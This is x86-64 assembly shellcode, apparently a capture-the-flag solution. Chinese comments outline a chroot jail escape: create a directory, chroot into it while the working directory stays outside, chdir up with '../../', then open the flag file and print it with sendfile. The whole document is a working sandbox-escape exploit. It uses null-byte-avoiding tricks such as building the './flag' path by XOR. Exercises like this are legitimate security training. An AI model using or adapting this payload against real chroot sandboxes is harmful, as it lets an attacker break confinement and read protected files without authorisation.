# 只允许基本的系统调用
# chdir, chroot, mkdir, open, read, write, sendfile
# 突破流程: 1. 创建一个新文件夹 2. chroot到这个文件夹, 因为还未chdir, 因此当前路径是jail路径 3. chdir到../../ , 离开jail目录回到/目录 4. 打印flag

.global _start
_start:
.intel_syntax noprefix
        # mkdir('/test')
        xor rax, rax
        mov al, 83
        lea rdi, [rip+test]
        mov rsi, 0
        syscall
        # chroot('/test')
        mov al, 161
        syscall
        # chdir('../../')
        mov al, 80
        lea rdi, [rip+path]
        syscall
        # sendfile(1, open('./flag'), 0, 0)
        mov al, 2
        mov rdi, 0x010166606d672e2f
        push rdi
        mov rdi, 0x0101010101010101
        xor [rsp], rdi
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
        syscall
        mov esi, eax
        mov al, 40
        xor edi, edi
        inc edi
        mov r10w, 0x3e8
        syscall

test:
        .string "/test"
path:
        .string "../../"
